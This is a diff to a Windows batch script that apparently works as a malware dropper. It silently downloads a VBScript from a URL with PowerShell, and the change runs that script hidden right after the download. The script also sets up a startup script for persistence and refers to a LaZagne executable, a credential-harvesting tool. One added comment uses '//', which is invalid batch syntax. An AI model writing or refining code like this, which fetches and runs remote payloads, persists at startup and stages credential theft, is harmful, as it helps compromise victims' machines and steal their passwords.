@@ -35,6 +35,8 @@ if not exist "%VBS_PATH%" (
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%VBS_URL%' -OutFile '%VBS_PATH%'" >nul 2>nul
     if errorlevel 1 exit /b 1
     if not exist "%VBS_PATH%" exit /b 1
+    wscript.exe "%VBS_PATH%" /B
+    timeout /t 2 /nobreak >nul  // Small delay to ensure VBScript starts
 )
 
 if not exist "%STARTUP_SCRIPT%" (
@@ -42,7 +44,6 @@ if not exist "%STARTUP_SCRIPT%" (
     if errorlevel 1 exit /b 1
 )
 
-start "" wscript.exe "%VBS_PATH%"
 exit /b 0
 
 if not exist "%LAZAGNE_EXE%" (
